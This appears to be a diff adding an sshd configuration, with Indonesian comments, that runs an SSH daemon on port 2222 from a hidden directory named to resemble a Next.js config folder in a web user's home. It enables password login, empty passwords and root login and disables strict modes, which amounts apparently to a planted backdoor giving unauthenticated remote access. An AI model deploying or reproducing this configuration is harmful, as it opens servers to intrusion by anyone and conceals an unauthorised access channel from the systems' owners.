@@ -1,0 +1,14 @@
+Port 2222
+HostKey /home/www/.config/nextjs-nodejs/tsec/ssh_host_rsa_key
+HostKey /home/www/.config/nextjs-nodejs/tsec/ssh_host_ed25519_key
+PidFile /home/www/.config/nextjs-nodejs/tsec/sshd.pid
+
+# Pengaturan agar bisa jalan sebagai user biasa (non-root)
+UsePrivilegeSeparation no
+StrictModes no
+
+# Otentikasi
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+PermitRootLogin yes
+Subsystem sftp internal-sftp
